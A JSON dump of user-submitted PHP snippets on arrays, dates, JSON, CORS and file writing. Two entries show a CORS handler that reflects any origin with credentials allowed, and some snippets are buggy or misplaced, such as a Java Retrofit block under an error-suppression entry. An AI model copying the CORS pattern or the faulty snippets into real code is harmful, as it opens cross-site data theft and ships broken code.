    "description": "<?php header(\"Access-Control-Allow-Origin: *\"); header(\"Access-Control-Allow-Headers: *\"); ...\n <?php  header(\"Access-Control-Allow-Origin: *\");\nheader(\"Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}\");\n/**  *  An example CORS-compliant method.  It will allow any GET, POST, or OPTIONS requests from any  *  origin.  *  *  In a production environment, you probably want to be more restrictive, but this gives you  *  the general idea of what is involved.  For the nitty-gritty low-down, read:  *  *  - https://developer.mozilla.org/en/HTTP_access_control  *  - http://www.w3.org/TR/cors/  *  */ function cors() {      // Allow from any origin     if (isset($_SERVER['HTTP_ORIGIN'])) {         // Decide if the origin in $_SERVER['HTTP_ORIGIN'] is one         // you want to allow, and if so:         header(\"Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}\");         header('Access-Control-Allow-Credentials: true');         header('Access-Control-Max-Age: 86400');    // cache for 1 day     }      // Access-Control headers are received during OPTIONS requests     if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {          if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_METHOD']))             // may also be using PUT, PATCH, HEAD etc             header(\"Access-Control-Allow-Methods: GET, POST, OPTIONS\");                   if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']))             header(\"Access-Control-Allow-Headers: {$_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']}\");          exit(0);     }      echo \"You have CORS!\"; }\n",
    "reg_date": "2021-10-12T10:17:22.000Z"
  },
  {
    "id": 3070,
    "keyword": null,
    "link": null,
    "title": " php Array to string conversion",
    "description": "Using implode() function in Php ----------------------- Syntax implode(separator,array);    Example <?php   //assigning value to the array   $dummyArr = array(\"Hello\",\"Greppers,\",\"Ankur\",\"here !\");      echo implode(\" \",$dummyArr);// Use of implode function   ?>      Output: Hello Greppers, Ankur here !\n$gadget = array( 'computer', 'mobile', 'tablet' ); echo implode($arr);\nphpCopy<?php    $array = [\"Lili\", \"Rose\", \"Jasmine\", \"Daisy\"];    $JsonObject = serialize($array);    echo \"The array is converted to the Json string.\";    echo \"\\n\";     echo\"The Json string is $JsonObject\"; ?> \n$person = [     'name' => 'Jon',     'age' => 26,     'status' => null,     'friends' => ['Matt', 'Kaci', 'Jess'] ];  echo json_encode($person); // {\"name\":\"Jon\",\"age\":26,\"status\":null,\"friends\":[\"Matt\",\"Kaci\",\"Jess\"]} \n// for one-dimentional arrays $str = implode('|', $arr);\t// \"v1|v2|v3\"...  // for multi-dimensional/structured arrays, or to keep hierarchy $str = json_encode($arr); // or $str = var_export($arr);\n// Use json_encode to collapse the array to json string: $stuff = array(1,2,3); print json_encode($stuff);   //Prints [1,2,3]\n",
    "reg_date": "2021-10-12T10:17:22.000Z"
  },
  {
    "id": 3071,
    "keyword": null,
    "link": null,
    "title": " php DateTime comparation",
    "description": " <?php $date1 = new DateTime(\"now\"); $date2 = new DateTime(\"tomorrow\");  var_dump($date1 == $date2); var_dump($date1 < $date2); var_dump($date1 > $date2); ?>  \ndev:~# php <?php date_default_timezone_set('Europe/London');  $d1 = new DateTime('2008-08-03 14:52:10'); $d2 = new DateTime('2008-01-03 11:11:10'); var_dump($d1 == $d2); var_dump($d1 > $d2); var_dump($d1 < $d2); ?> bool(false) bool(true) bool(false) dev:~# php -v PHP 5.2.6-1+lenny3 with Suhosin-Patch 0.9.6.2 (cli) (built: Apr 26 2009 20:09:03) Copyright (c) 1997-2008 The PHP Group Zend Engine v2.2.0, Copyright (c) 1998-2008 Zend Technologies dev:~#\n <?php $datetime1 = new DateTime('2009-10-11'); $datetime2 = new DateTime('2009-10-13'); $interval = $datetime1->diff($datetime2); echo $interval->format('%R%a d&iacute;as'); ?>  \n",
    "reg_date": "2021-10-12T10:17:22.000Z"
  },
  {
    "id": 3072,
    "keyword": null,
    "link": null,
    "title": " php Error!: could not find driver",
    "description": "apt-get install php-mysql\n",
    "reg_date": "2021-10-12T10:17:22.000Z"
  },
  {
    "id": 3073,
    "keyword": null,
    "link": null,
    "title": " php Fatal error: Cannot redeclare Person::setName()",
    "description": "// It means you've already created a class.  // For instance: class Foo {}  // some code here  class Foo {}  // That second Foo would throw the error.\n",
    "reg_date": "2021-10-12T10:17:22.000Z"
  },
  {
    "id": 3074,
    "keyword": null,
    "link": null,
    "title": " php JSON PRETTY PRINT and ?",
    "description": "$json_string = json_encode($data, JSON_PRETTY_PRINT);\nheader('Content-Type: application/json');   JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES\n",
    "reg_date": "2021-10-12T10:17:22.000Z"
  },
  {
    "id": 3075,
    "keyword": null,
    "link": null,
    "title": " php Previewing External Pages like Facebook",
    "description": "require_once('OpenGraph.php');       $graph = OpenGraph::fetch($url); /*             echo \"<br>\" . \"Title: \" . $graph->title . \"<br>\";                // Getting started with Facebook Open Graph             echo \"Site name: \" . $graph->siteName . \"<br>\";         // YouTube             echo \"Description: \" . $graph->description . \"<br>\";    // Originally recorded at the Facebook World ...             echo \"Canonical URL: \" . $graph->url . \"<br>\";          // http://www.youtube.com/watch?v=P422jZg50X4             echo \"Image Url: \" . $graph->image . \"<br>\";             // Images             $image = $graph->images[0];             echo \"Image[0] URL: \" . $image->url . \"<br>\";            // https://i1.ytimg.com/vi/P422jZg50X4/maxresdefault.jpg             echo \"Image[0] height: \" . $image->height . \"<br>\";       // null (May return height in pixels on other pages)             echo \"Image[0] width: \" . $image->width . \"<br>\";         // null (May return width in pixels on other pages)              // Videos             $video = $graph->videos[0];             echo \"Video URL: \" . $video->url . \"<br>\";        // http://www.youtube.com/v/P422jZg50X4?version=3&autohide=1             echo \"Video height: \" . $video->height . \"<br>\";       // 1080             echo \"Video width: \" . $video->width . \"<br>\";      // 1920             echo \"Video type: \" . $video->type . \"<br>\";      // application/x-shockwave-flash */              var_dump($graph->keys());              var_dump($graph->schema);              foreach ($graph as $key => $value) {                  echo \"$key => $value\" . \"<br><br>\";              } /*   // more mods              $graph = OpenGraph::fetch($url);             echo '<img src=\"'. $graph->image.'\" width=\"25%\" height=\"25%\"/>';             echo \"<br>\".$graph->title . \"<br>\";                            // echo \"Site name: \" . $graph->siteName . \"<br>\";                      echo \"<br>\" . $graph->description . \"<br>\";    */   https://github.com/scottmac/opengraph alts https://ogp.me/\n",
    "reg_date": "2021-10-12T10:17:22.000Z"
  },
  {
    "id": 3076,
    "keyword": null,
    "link": null,
    "title": " php Undefined",
    "description": "if (isset($variable)) { /* do something */ };\n/**  * Returns a bool (true or false)  */ isset($x); /**  * Examples  */ $x = 'myValue'; if(isset($x)){ \techo 'x is set'; } /**  * this will echo out 'x is set'  */   $x = null; if(isset($x)){ \techo 'x is set'; } /**  * This will NOT echo out 'x is set'  */   if(isset($y)){  \techo 'y is set';  } /**  * This will NOT echo out 'y is set'  */  \n$myId = 0; function run(){   global $myId; \techo $myId; }\n",
    "reg_date": "2021-10-12T10:17:22.000Z"
  },
  {
    "id": 3077,
    "keyword": null,
    "link": null,
    "title": " php   construct",
    "description": "public function __construct(){}\n__construct ([ mixed $args = \"\" [, $... ]] ) : void\n",
    "reg_date": "2021-10-12T10:17:22.000Z"
  },
  {
    "id": 3078,
    "keyword": null,
    "link": null,
    "title": " php  disable errors",
    "description": "error_reporting(0); @ini_set('display_errors', 0);\n",
    "reg_date": "2021-10-12T10:17:22.000Z"
  },
  {
    "id": 3079,
    "keyword": null,
    "link": null,
    "title": " php  in html attributes",
    "description": "<span title=\"<?php echo htmlspecialchars($variable); ?>\"> \n",
    "reg_date": "2021-10-12T10:17:23.000Z"
  },
  {
    "id": 3080,
    "keyword": null,
    "link": null,
    "title": " php  json key value loop",
    "description": "$json = '{\"1\":\"a\",\"2\":\"b\",\"3\":\"c\",\"4\":\"d\",\"5\":\"e\"}';  $obj = json_decode($json, TRUE);  foreach($obj as $key => $value)  { echo 'Your key is: '.$key.' and the value of the key is:'.$value; }\n",
    "reg_date": "2021-10-12T10:17:23.000Z"
  },
  {
    "id": 3081,
    "keyword": null,
    "link": null,
    "title": " php  supress errors",
    "description": "error_reporting(0); @ini_set('display_errors', 0);\nRetrofit retrofit = new Retrofit.Builder()        .baseUrl(https://api.themoviedb.org/3/)        .addConverterFactory(GsonConverterFactory.create())        .addCallAdapterFactory(RxJava2CallAdapterFactory.create())        .build();\n",
    "reg_date": "2021-10-12T10:17:23.000Z"
  },
  {
    "id": 3082,
    "keyword": null,
    "link": null,
    "title": " php a to b latlong dstance",
    "description": "<?php  /*::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::*/ /*::                                                                         :*/ /*::  This routine calculates the distance between two points (given the     :*/ /*::  latitude/longitude of those points). It is being used to calculate     :*/ /*::  the distance between two locations using GeoDataSource(TM) Products    :*/ /*::                                                                         :*/ /*::  Definitions:                                                           :*/ /*::    South latitudes are negative, east longitudes are positive           :*/ /*::                                                                         :*/ /*::  Passed to function:                                                    :*/ /*::    lat1, lon1 = Latitude and Longitude of point 1 (in decimal degrees)  :*/ /*::    lat2, lon2 = Latitude and Longitude of point 2 (in decimal degrees)  :*/ /*::    unit = the unit you desire for results                               :*/ /*::           where: 'M' is statute miles (default)                         :*/ /*::                  'K' is kilometers                                      :*/ /*::                  'N' is nautical miles                                  :*/ /*::  Worldwide cities and other features databases with latitude longitude  :*/ /*::  are available at https://www.geodatasource.com                          :*/ /*::                                                                         :*/ /*::  For enquiries, please contact sales@geodatasource.com                  :*/ /*::                                                                         :*/ /*::  Official Web site: https://www.geodatasource.com                        :*/ /*::                                                                         :*/ /*::         GeoDataSource.com (C) All Rights Reserved 2018                  :*/ /*::                                                                         :*/ /*::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::*/ function distance($lat1, $lon1, $lat2, $lon2, $unit) {   if (($lat1 == $lat2) && ($lon1 == $lon2)) {     return 0;   }   else {     $theta = $lon1 - $lon2;     $dist = sin(deg2rad($lat1)) * sin(deg2rad($lat2)) +  cos(deg2rad($lat1)) * cos(deg2rad($lat2)) * cos(deg2rad($theta));     $dist = acos($dist);     $dist = rad2deg($dist);     $miles = $dist * 60 * 1.1515;     $unit = strtoupper($unit);      if ($unit == \"K\") {       return ($miles * 1.609344);     } else if ($unit == \"N\") {       return ($miles * 0.8684);     } else {       return $miles;     }   } }  echo distance(32.9697, -96.80322, 29.46786, -98.53506, \"M\") . \" Miles<br>\"; echo distance(32.9697, -96.80322, 29.46786, -98.53506, \"K\") . \" Kilometers<br>\"; echo distance(32.9697, -96.80322, 29.46786, -98.53506, \"N\") . \" Nautical Miles<br>\";  ?>\n",
    "reg_date": "2021-10-12T10:17:23.000Z"
  },
  {
    "id": 3083,
    "keyword": null,
    "link": null,
    "title": " php abstract class static method",
    "description": "Answer   https://stackoverflow.com/questions/41611058/why-does-php-allow-abstract-static-functions/41611876\n",
    "reg_date": "2021-10-12T10:17:23.000Z"
  },
  {
    "id": 3084,
    "keyword": null,
    "link": null,
    "title": " php access json object",
    "description": "<?php   // JSON string   $someJSON = '[{\"name\":\"Jonathan Suh\",\"gender\":\"male\"},{\"name\":\"William Philbin\",\"gender\":\"male\"},{\"name\":\"Allison McKinnery\",\"gender\":\"female\"}]';    // Convert JSON string to Object   $someObject = json_decode($someJSON);   echo $someObject[0]->name; // Access Object data ?> \n<?php  $data = '{ \t\"name\": \"Aragorn\", \t\"race\": \"Human\" }';  $character = json_decode($data); echo $character->name;\n",
    "reg_date": "2021-10-12T10:17:23.000Z"
  },
  {
    "id": 3085,
    "keyword": null,
    "link": null,
    "title": " php access origin",
    "description": " <?php  header(\"Access-Control-Allow-Origin: *\");\n/**  *  An example CORS-compliant method.  It will allow any GET, POST, or OPTIONS requests from any  *  origin.  *  *  In a production environment, you probably want to be more restrictive, but this gives you  *  the general idea of what is involved.  For the nitty-gritty low-down, read:  *  *  - https://developer.mozilla.org/en/HTTP_access_control  *  - http://www.w3.org/TR/cors/  *  */ function cors() {      // Allow from any origin     if (isset($_SERVER['HTTP_ORIGIN'])) {         // Decide if the origin in $_SERVER['HTTP_ORIGIN'] is one         // you want to allow, and if so:         header(\"Access-Control-Allow-Origin: {$_SERVER['HTTP_ORIGIN']}\");         header('Access-Control-Allow-Credentials: true');         header('Access-Control-Max-Age: 86400');    // cache for 1 day     }      // Access-Control headers are received during OPTIONS requests     if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {          if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_METHOD']))             // may also be using PUT, PATCH, HEAD etc             header(\"Access-Control-Allow-Methods: GET, POST, OPTIONS\");                   if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']))             header(\"Access-Control-Allow-Headers: {$_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']}\");          exit(0);     }      echo \"You have CORS!\"; }\n",
    "reg_date": "2021-10-12T10:17:23.000Z"
  },
  {
    "id": 3086,
    "keyword": null,
    "link": null,
    "title": " php add 0 before number",
    "description": "str_pad($month, 2, '0', STR_PAD_LEFT); \n$number = 4; str_pad($number, 2, '0', STR_PAD_LEFT); // returns 04  $number = 14; str_pad($number, 2, '0', STR_PAD_LEFT); // returns 14\n",
    "reg_date": "2021-10-12T10:17:23.000Z"
  },
  {
    "id": 3087,
    "keyword": null,
    "link": null,
    "title": " php add array values with same keys",
    "description": "$sumArray = array();  foreach ($myArray as $k=>$subArray) {   foreach ($subArray as $id=>$value) {     $sumArray[$id]+=$value;   } }  print_r($sumArray); \n",
    "reg_date": "2021-10-12T10:17:23.000Z"
  },
  {
    "id": 3088,
    "keyword": null,
    "link": null,
    "title": " php add days to date",
    "description": "<?php  // PHP program to add days to $Date     // Declare a date  $date = \"2019-05-10\";     // Add days to date and display it  echo date('Y-m-d', strtotime($date. ' + 10 days'));     ?> \n$date = \"Mar 03, 2011\"; $date = strtotime($date); $date = strtotime(\"+7 day\", $date); echo date('M d, Y', $date);\n<?php   // adding extra days to date       // Steps: \t// 1) using carbon     // 2) using strtotime            //Step 1   $date = date('Y M d h:i:s') // 2020 09 22 22:09:26 UTC      $new_date = Carbon::parse($date->addDays(1); // adds extra day                                // Step 2   $date = date('Y M d h:i:s') // 2020 09 22 22:09:26 UTC      echo $new_date = date('Y M d h:i:s', strtotime($date. '+1 day')); ?>\n$start_date = \"2015/03/02\";   $date = strtotime($start_date); $date = strtotime(\"+7 day\", $date); echo date('Y/m/d', $date); \n$created_at=date('Y-m-d H:i:s', strtotime(date(\"Y-m-d H:i:s\") . ' +1 day'));\n$date = new DateTime('2020-11-24'); $date->add(new DateInterval(\"P9D\"));  echo $date->format('Y-m-d');\n",
    "reg_date": "2021-10-12T10:17:24.000Z"
  },
  {
    "id": 3089,
    "keyword": null,
    "link": null,
    "title": " php add element to array",
    "description": "$myArr = [1, 2, 3, 4];  array_push($myArr, 5, 8); print_r($myArr); // [1, 2, 3, 4, 5, 8]  $myArr[] = -1; print_r($myArr); // [1, 2, 3, 4, 5, 8, -1]\narray_push($cart, 13); \n$fruits = [\"apple\", \"banana\"]; // array_push() function inserts one or more elements to the end of an array array_push($fruits, \"orange\");  // If you use array_push() to add one element to the array, it's better to use // $fruits[] = because in that way there is no overhead of calling a function. $fruits[] = \"orange\";  // output: Array ( [0] => apple [1] => banana [2] => orange )\n <?php $cesta = array(\"laranja\", \"morango\"); array_push($cesta, \"melancia\", \"batata\"); print_r($cesta); ?>  \n <?php $stack = array(\"orange\", \"banana\"); array_push($stack, \"apple\", \"raspberry\"); ?>  \n<?php   $z = ['me','you', 'he'];   array_push($z, 'she', 'it');   print_r($z); ?>\n",
    "reg_date": "2021-10-12T10:17:24.000Z"
  },
  {
    "id": 3090,
    "keyword": null,
    "link": null,
    "title": " php add element to array first position",
    "description": " <?php $queue = array(\"orange\", \"banana\"); array_unshift($queue, \"apple\", \"raspberry\"); print_r($queue); ?>   Array (     [0] => apple     [1] => raspberry     [2] => orange     [3] => banana )  \n",
    "reg_date": "2021-10-12T10:17:24.000Z"
  },
  {
    "id": 3091,
    "keyword": null,
    "link": null,
    "title": " php add get to link",
    "description": "$url .= $url.(parse_url($url, PHP_URL_QUERY) ? '&' : '?').'category=action';\n",
    "reg_date": "2021-10-12T10:17:24.000Z"
  },
  {
    "id": 3092,
    "keyword": null,
    "link": null,
    "title": " php add hours to current date",
    "description": "$new_time = date(\"Y-m-d H:i:s\", strtotime('+5 hours'));\n$minutes_to_add = 5;  $time = new DateTime('2011-11-17 05:05'); $time->add(new DateInterval('PT' . $minutes_to_add . 'M'));  $stamp = $time->format('Y-m-d H:i');\n",
    "reg_date": "2021-10-12T10:17:24.000Z"
  },
  {
    "id": 3093,
    "keyword": null,
    "link": null,
    "title": " php add item to array",
    "description": "$myArr = [1, 2, 3, 4];  array_push($myArr, 5, 8); print_r($myArr); // [1, 2, 3, 4, 5, 8]  $myArr[] = -1; print_r($myArr); // [1, 2, 3, 4, 5, 8, -1]\narray_push($cart, 13); \n$fruits = [\"apple\", \"banana\"]; // array_push() function inserts one or more elements to the end of an array array_push($fruits, \"orange\");  // If you use array_push() to add one element to the array, it's better to use // $fruits[] = because in that way there is no overhead of calling a function. $fruits[] = \"orange\";  // output: Array ( [0] => apple [1] => banana [2] => orange )\n <?php $cesta = array(\"laranja\", \"morango\"); array_push($cesta, \"melancia\", \"batata\"); print_r($cesta); ?>  \n <?php $stack = array(\"orange\", \"banana\"); array_push($stack, \"apple\", \"raspberry\"); ?>  \n<?php   $z = ['me','you', 'he'];   array_push($z, 'she', 'it');   print_r($z); ?>\n",
    "reg_date": "2021-10-12T10:17:24.000Z"
  },
  {
    "id": 3094,
    "keyword": null,
    "link": null,
    "title": " php add to associative array",
    "description": "// for php 5.4+ $data += [$key => $value];  // for php 5.4- $data += array($key => $value);\n<?php  /*  There are 3 Types of array in php   1. Indexed arrays - Arrays with a numeric index 2. Associative arrays - Arrays with named keys 3. Multidimensional arrays - Arrays containing one or more arrays  This is the second one - Associative arrays */  $age = array(\"Samy\"=>\"35\", \"Naveen\"=>\"37\", \"Amit\"=>\"43\"); echo \"Mr.Samy is \" . $age['Samy'] . \" years old.\";  ?>\n $a1=['aa'=>'123' , 'bb'=>'454'];  $a1 = array_merge( $a1 , ['a'=>1,'b'=>2] ) ; \n$a = array('foo' => 'bar'); // when you create $a['Title'] = 'blah'; // later \n$data[$category][] = $item;\n",
    "reg_date": "2021-10-12T10:17:24.000Z"
  },
  {
    "id": 3095,
    "keyword": null,
    "link": null,
    "title": " php add to existing associative array",
    "description": "// for php 5.4+ $data += [$key => $value];  // for php 5.4- $data += array($key => $value);\n $a1=['aa'=>'123' , 'bb'=>'454'];  $a1 = array_merge( $a1 , ['a'=>1,'b'=>2] ) ; \n",
    "reg_date": "2021-10-12T10:17:24.000Z"
  },
  {
    "id": 3096,
    "keyword": null,
    "link": null,
    "title": " php addcslashes",
    "description": "$str = addslashes('What does \"yolo\" mean?'); echo($str); $str = addcslashes('What does \"yolo\" mean?','?'); echo($str);\n$str = addslashes('What does \"yolo\" mean?'); echo($str);\n$str = addslashes('What does \"yolo\" mean?'); // for either ' or \" echo($str); $str = addcslashes('What does \"yolo\" mean?','?'); // specify charaters to preceed by \\ echo($str);\n",
    "reg_date": "2021-10-12T10:17:24.000Z"
  },
  {
    "id": 3097,
    "keyword": null,
    "link": null,
    "title": " php all date formats",
    "description": "<?php // Assuming today is March 10th, 2001, 5:16:18 pm, and that we are in the // Mountain Standard Time (MST) Time Zone // $today = date(\"F j, Y, g:i a\");                 // March 10, 2001, 5:16 pm $today = date(\"m.d.y\");                         // 03.10.01 $today = date(\"j, n, Y\");                       // 10, 3, 2001 $today = date(\"Ymd\");                           // 20010310 $today = date('h-i-s, j-m-y, it is w Day');     // 05-16-18, 10-03-01, 1631 1618 6 Satpm01 $today = date('\\i\\t \\i\\s \\t\\h\\e jS \\d\\a\\y.');   // it is the 10th day. $today = date(\"D M j G:i:s T Y\");               // Sat Mar 10 17:16:18 MST 2001 $today = date('H:m:s \\m \\i\\s\\ \\m\\o\\n\\t\\h');     // 17:03:18 m is month $today = date(\"H:i:s\");                         // 17:16:18 $today = date(\"Y-m-d H:i:s\");                   // 2001-03-10 17:16:18 (the MySQL DATETIME format) ?>    /*d\tDay of the month, 2 digits with leading zeros\t01 to 31 D\tA textual representation of a day, three letters\tMon through Sun j\tDay of the month without leading zeros\t1 to 31 l (lowercase 'L')\tA full textual representation of the day of the week\tSunday through Saturday N\tISO-8601 numeric representation of the day of the week (added in PHP 5.1.0)\t1 (for Monday) through 7 (for Sunday) S\tEnglish ordinal suffix for the day of the month, 2 characters\tst, nd, rd or th. Works well with j w\tNumeric representation of the day of the week\t0 (for Sunday) through 6 (for Saturday) z\tThe day of the year (starting from 0)\t0 through 365 Week\t---\t--- W\tISO-8601 week number of year, weeks starting on Monday\tExample: 42 (the 42nd week in the year) Month\t---\t--- F\tA full textual representation of a month, such as January or March\tJanuary through December m\tNumeric representation of a month, with leading zeros\t01 through 12 M\tA short textual representation of a month, three letters\tJan through Dec n\tNumeric representation of a month, without leading zeros\t1 through 12 t\tNumber of days in the given month\t28 through 31 Year\t---\t--- L\tWhether it's a leap year\t1 if it is a leap year, 0 otherwise. o\tISO-8601 week-numbering year. This has the same value as Y, except that if the ISO week number (W) belongs to the previous or next year, that year is used instead. (added in PHP 5.1.0)\tExamples: 1999 or 2003 Y\tA full numeric representation of a year, 4 digits\tExamples: 1999 or 2003 y\tA two digit representation of a year\tExamples: 99 or 03 Time\t---\t--- a\tLowercase Ante meridiem and Post meridiem\tam or pm A\tUppercase Ante meridiem and Post meridiem\tAM or PM B\tSwatch Internet time\t000 through 999 g\t12-hour format of an hour without leading zeros\t1 through 12 G\t24-hour format of an hour without leading zeros\t0 through 23 h\t12-hour format of an hour with leading zeros\t01 through 12 H\t24-hour format of an hour with leading zeros\t00 through 23 i\tMinutes with leading zeros\t00 to 59 s\tSeconds with leading zeros\t00 through 59 u\tMicroseconds (added in PHP 5.2.2). Note that date() will always generate 000000 since it takes an integer parameter, whereas DateTime::format() does support microseconds if DateTime was created with microseconds.\tExample: 654321 v\tMilliseconds (added in PHP 7.0.0). Same note applies as for u.\tExample: 654 Timezone\t---\t--- e\tTimezone identifier (added in PHP 5.1.0)\tExamples: UTC, GMT, Atlantic/Azores I (capital i)\tWhether or not the date is in daylight saving time\t1 if Daylight Saving Time, 0 otherwise. O\tDifference to Greenwich time (GMT) without colon between hours and minutes\tExample: +0200 P\tDifference to Greenwich time (GMT) with colon between hours and minutes (added in PHP 5.1.3)\tExample: +02:00 T\tTimezone abbreviation\tExamples: EST, MDT ... Z\tTimezone offset in seconds. The offset for timezones west of UTC is always negative, and for those east of UTC is always positive.\t-43200 through 50400 Full Date/Time\t---\t--- c\tISO 8601 date (added in PHP 5)\t2004-02-12T15:19:21+00:00 r\t&raquo; RFC 2822 formatted date\tExample: Thu, 21 Dec 2000 16:01:07 +0200 U\tSeconds since the Unix Epoch (January 1 1970 00:00:00 GMT)\tSee also time() */\n$today = date(\"F j, Y, g:i a\");               // March 10, 2001, 5:16 pm $today = date(\"m.d.y\");                       // 03.10.01 $today = date(\"j, n, Y\");                     // 10, 3, 2001 $today = date(\"Ymd\");                         // 20010310 $today = date('h-i-s, j-m-y, it is w Day');   // 05-16-18, 10-03-01, 1631 1618 6 Satpm01 $today = date('\\i\\t \\i\\s \\t\\h\\e jS \\d\\a\\y.'); // it is the 10th day. $today = date(\"D M j G:i:s T Y\");             // Sat Mar 10 17:16:18 MST 2001 $today = date('H:m:s \\m \\i\\s\\ \\m\\o\\n\\t\\h');   // 17:03:18 m is month $today = date(\"H:i:s\");                       // 17:16:18 $today = date(\"Y-m-d H:i:s\");                 // 2001-03-10 17:16:18 (the MySQL DATETIME format) \n<?php echo date(\"F j, Y, g:i a\").\"<br>\";               // March 10, 2001, 5:16 pm echo date(\"m.d.y\").\"<br>\";                       // 03.10.01 echo date(\"j, n, Y\").\"<br>\";                     // 10, 3, 2001 echo date(\"Ymd\").\"<br>\";                         // 20010310 echo date('h-i-s, j-m-y, it is w Day').\"<br>\";   // 05-16-18, 10-03-01, 1631 1618 6 Satpm01 echo date('\\i\\t \\i\\s \\t\\h\\e jS \\d\\a\\y.').\"<br>\"; // it is the 10th day. echo date(\"D M j G:i:s T Y\").\"<br>\";             // Sat Mar 10 17:16:18 MST 2001 echo date('H:m:s \\m \\i\\s\\ \\m\\o\\n\\t\\h').\"<br>\";   // 17:03:18 m is month echo date(\"H:i:s\").\"<br>\";                       // 17:16:18 echo date(\"Y-m-d H:i:s\").\"<br>\";                 // 2001-03-10 17:16:18 (the MySQL DATETIME format) \n<?php // set the default timezone to use. Available since PHP 5.1 date_default_timezone_set('UTC');   // Prints something like: Monday echo date(\"l\");  // Prints something like: Monday 8th of August 2005 03:12:46 PM echo date('l jS \\of F Y h:i:s A');  // Prints: July 1, 2000 is on a Saturday echo \"July 1, 2000 is on a \" . date(\"l\", mktime(0, 0, 0, 7, 1, 2000));  /* use the constants in the format parameter */ // prints something like: Wed, 25 Sep 2013 15:28:57 -0700 echo date(DATE_RFC2822);  // prints something like: 2000-07-01T00:00:00+00:00 echo date(DATE_ATOM, mktime(0, 0, 0, 7, 1, 2000)); ?>\ndate('m/d/Y h:i:s a',strtotime($val['EventDateTime'])); \n",
    "reg_date": "2021-10-12T10:17:24.000Z"
  },
  {
    "id": 3098,
    "keyword": null,
    "link": null,
    "title": " php all keys in array",
    "description": "<?php $array = array(     'fruit1' => 'apple',     'fruit2' => 'orange',     'fruit3' => 'grape',     'fruit4' => 'apple',     'fruit5' => 'apple');  $keys = array_keys($array);\t\t// return array $values = array_values($array);\t// return array ?>\n$array = array(0 => 100, \"cor\" => \"vermelho\"); print_r(array_keys($array));  $array = array(\"azul\", \"vermelho\", \"verde\", \"azul\", \"azul\"); print_r(array_keys($array, \"azul\"));  $array = array(\"cor\"     => array(\"azul\", \"vermelho\", \"verde\"),                \"tamanho\" => array(\"pequeno\", \"medio\", \"grande\")); print_r(array_keys($array)); \n<?php $age=array(\"Peter\"=>\"35\",\"Ben\"=>\"37\",\"Joe\"=>\"43\"); foreach($age as $x=>$x_value)   {   echo \"Key=\" . $x . \", Value=\" . $x_value;   echo \"<br>\";   } ?>\n <?php $array = array(     'fruit1' => 'apple',     'fruit2' => 'orange',     'fruit3' => 'grape',     'fruit4' => 'apple',     'fruit5' => 'apple');  // this cycle echoes all associative array // key where value equals \"apple\" while ($fruit_name = current($array)) {     if ($fruit_name == 'apple') {         echo key($array).'<br />';     }     next($array); } ?>  \n",
    "reg_date": "2021-10-12T10:17:25.000Z"
  },
  {
    "id": 3099,
    "keyword": null,
    "link": null,
    "title": " php and ajax on select option",
    "description": "<select name=\"allbooks\" id=\"allbooks\">   <option value=\"none\" ></option>   <option value=\"allbooks\" >All Books</option> </select> <div id=\"show\">   <!-- ITEMS TO BE DISPLAYED HERE --> </div>    <script src=\"jquery-1.9.1.min.js\"></script> <!-- CHANGE THE JQUERY FILE DEPENDING ON THE VERSION YOU HAVE DOWNLOADED --> <script type=\"text/javascript\">   $(document).ready(function(){ /* PREPARE THE SCRIPT */     $(\"#allbooks\").change(function(){ /* WHEN YOU CHANGE AND SELECT FROM THE SELECT FIELD */       var allbooks = $(this).val(); /* GET THE VALUE OF THE SELECTED DATA */       var dataString = \"allbooks=\"+allbooks; /* STORE THAT TO A DATA STRING */        $.ajax({ /* THEN THE AJAX CALL */         type: \"POST\", /* TYPE OF METHOD TO USE TO PASS THE DATA */         url: \"get-data.php\", /* PAGE WHERE WE WILL PASS THE DATA */         data: dataString, /* THE DATA WE WILL BE PASSING */         success: function(result){ /* GET THE TO BE RETURNED DATA */           $(\"#show\").html(result); /* THE RETURNED DATA WILL BE SHOWN IN THIS DIV */         }       });      });   }); </script>      if(!empty($_POST[\"allbooks\"])){   /* DO YOUR QUERY HERE AND GET THE OUTPUT YOU WANT */   echo $output; /* PRINT THE OUTPUT YOU WANT, IT WILL BE RETURNED TO THE ORIGINAL PAGE */ }\n",
    "reg_date": "2021-10-12T10:17:25.000Z"
  },
  {
    "id": 3100,
    "keyword": null,
    "link": null,
    "title": " php append element to array",
    "description": "$myArr = [1, 2, 3, 4];  array_push($myArr, 5, 8); print_r($myArr); // [1, 2, 3, 4, 5, 8]  $myArr[] = -1; print_r($myArr); // [1, 2, 3, 4, 5, 8, -1]\narray_push($cart, 13); \n <?php $stack = array(\"orange\", \"banana\"); array_push($stack, \"apple\", \"raspberry\"); ?>  \narray_push ( array &$array [, mixed $... ] ) : int or $array[] = $var;\n",
    "reg_date": "2021-10-12T10:17:25.000Z"
  },
  {
    "id": 3101,
    "keyword": null,
    "link": null,
    "title": " php append file",
    "description": "// LOCK_EX will prevent anyone else writing to the file at the same time // PHP_EOL will add linebreak after each line $txt = \"data-to-add\"; $myfile = file_put_contents('logs.txt', $txt.PHP_EOL , FILE_APPEND | LOCK_EX);  // Second option is this $myfile = fopen(\"logs.txt\", \"a\") or die(\"Unable to open file!\"); $txt = \"user id date\"; fwrite($myfile, \"\\n\". $txt); fclose($myfile);\n<?php  $file = 'myFile.txt'; $text = \"This is my Text\\n\"; file_put_contents($file, $text, FILE_APPEND | LOCK_EX);  // adds \"This is my Text\" and a linebreak to the end of \"myFile.txt\" // \"LOCK_EX\" prevents anyone else writing to the file at the same time  ?> \n$log_content=\"This line is logged on 2020-08-14 09:55:00\"; $myfile = fopen(\"log.txt\", \"a\") or die(\"Unable to open file!\"); fwrite($myfile, $log_content); fclose($myfile);\n",
    "reg_date": "2021-10-12T10:17:25.000Z"
  },
  {
    "id": 3102,
    "keyword": null,
    "link": null,
    "title": " php append line to file",
